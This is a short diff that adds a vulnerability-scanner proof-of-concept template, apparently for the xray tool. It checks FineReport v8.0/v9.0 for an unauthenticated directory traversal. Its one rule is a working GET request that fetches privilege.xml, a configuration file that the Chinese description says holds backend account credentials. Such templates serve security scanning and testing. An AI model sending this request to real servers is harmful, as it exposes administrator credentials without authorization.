@@ -1,0 +1,12 @@
+name: poc-yaml-finereport-Directory-Traversal
+rules:
+  - method: GET
+    path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    follow_redirects: false
+    expression: |
+      status == 200 && body.bcontains(b'xml')
+detail:
+  author: 'l1nk3r'
+  finereport_version: 'v8.0&&v9.0'
+  description: '系统某处在未授权情况下可直接下载系统敏感配置文件，配置文件包括后台账号等' 
+  links: http://foreversong.cn/archives/1378
